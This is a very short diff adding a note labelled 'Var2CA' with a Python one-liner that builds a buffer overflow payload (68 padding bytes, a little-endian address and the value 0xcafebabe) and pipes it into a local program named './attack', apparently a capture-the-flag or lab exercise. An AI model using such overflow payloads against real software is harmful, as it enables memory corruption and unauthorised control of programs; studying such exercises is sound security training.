@@ -1,0 +1,3 @@
+Var2CA
+
+3a+b				python -c 'print 68 * "A"  + "\x18\x93\x04\x08" + "\xbe\xba\xfe\xca"' | ./attack 
